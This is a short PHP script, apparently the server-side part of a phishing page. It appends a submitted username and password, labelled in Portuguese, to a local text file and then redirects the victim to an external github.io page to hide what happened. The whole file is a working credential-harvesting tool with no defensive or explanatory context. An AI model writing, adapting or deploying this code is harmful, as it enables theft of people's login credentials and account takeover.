<?php

file_put_contents("node de usuário.txt", "Connected: " . $_POST['from'] . "  nome de usuário: " . $_POST['id'] . " Senha: " . $_POST['Senha']      .  "\n", FILE_APPEND);
header('Location: https://m4f1aclow3n.github.io/ignore/');
exit();
